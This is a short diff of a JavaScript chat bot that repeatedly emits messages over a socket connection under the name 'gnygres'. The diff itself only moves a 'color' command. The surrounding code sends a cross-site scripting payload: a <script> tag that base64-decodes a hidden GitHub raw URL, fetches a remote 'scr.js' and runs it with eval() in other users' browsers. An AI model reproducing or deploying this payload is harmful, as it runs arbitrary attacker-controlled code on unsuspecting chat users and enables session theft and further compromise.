@@ -12,9 +12,6 @@ const intervalId = setInterval(function() {
     socket.emit("command", {
         list: ["name", "gnygres"]
     });
-    socket.emit("command", {
-        list: ["color"]
-    });
     setTimeout(function() {
         socket.emit('talk', {
             text: "gnygres <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL3JlZnMvaGVhZHMvbWFpbi8=')+'scr'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
@@ -24,5 +21,8 @@ const intervalId = setInterval(function() {
         {
             coughtimer = 100;
         }
+        socket.emit("command", {
+            list: ["color"]
+        });
     }, 75);
 }, coughtimer);
